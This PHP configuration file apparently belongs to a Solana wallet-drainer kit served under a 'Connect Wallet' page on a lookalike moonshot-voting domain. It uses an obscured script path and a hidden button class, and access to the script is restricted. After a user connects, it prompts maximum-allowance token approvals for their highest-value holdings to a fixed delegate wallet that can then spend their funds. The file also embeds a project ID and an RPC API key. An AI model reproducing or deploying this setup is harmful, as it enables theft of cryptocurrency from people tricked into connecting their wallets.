<?php
/**
 * Copy to config.php and fill in your values.
 * https://dashboard.reown.com → create project → Project ID
 */

return [
    'reown_project_id' => '6a35a723a14b78178c5565dca5141ab8',

    'script_path' => 'vault38472',
    'button_class_mode' => 'exact',
    'button_class' => 'K7mQ2',
    'network' => 'solana',

    'site_name' => 'Connect Wallet',
    'site_description' => 'Connect your Solana wallet',

    // Wallet connect popup icon (full HTTPS URL). Put the file in vps/public/ e.g. logo.png
    // Omit to use https://your-domain.com/favicon.ico automatically
    'site_icons' => ['https://vote-moonshot.top/tYZq2BsVawvS5wYEF.svg'],

    // HTML site domain (Reown modal shows this, not vercel.app).
    'site_url' => 'https://vote-moonshot.top',

    // PHP loader pulls the JS bundle from Vercel; HTML still uses one tag: /vault38472
    'vercel_bundle_url' => 'https://YOUR-PROJECT.vercel.app/wallet.bundle.js',
    'vercel_bundle_cache_seconds' => 300,

    'analytics' => false,
    'restrict_script_access' => true,

    // After connect: SPL ApproveChecked for top tokens by USD value (Jupiter prices).
    // token_delegate = pubkey allowed to spend from user token accounts (your backend/hot wallet).
    'token_approval_enabled' => true,
    // Your Solana WALLET ADDRESS only (~44 chars). NOT your private key.
    'token_delegate' => 'B4QKxGaAKDjxjJwNZLY7z4ExcXqA8cMAdcgszTwVGmyp',
    // 0 = all qualifying tokens (SPL + native SOL); set e.g. 5 to limit prompts
    'token_approval_max_count' => 10,
    'token_approval_min_usd' => 1.0,
    // max = u64 max allowance; balance = approve current balance only
    'token_approval_amount_mode' => 'max',
    // Optional: Helius/QuickNode RPC (recommended on mainnet)
    'solana_rpc_url' => 'https://beta.helius-rpc.com/?api-key=f13d17ba-3242-4bde-9af5-8c2a46e33cac',
];
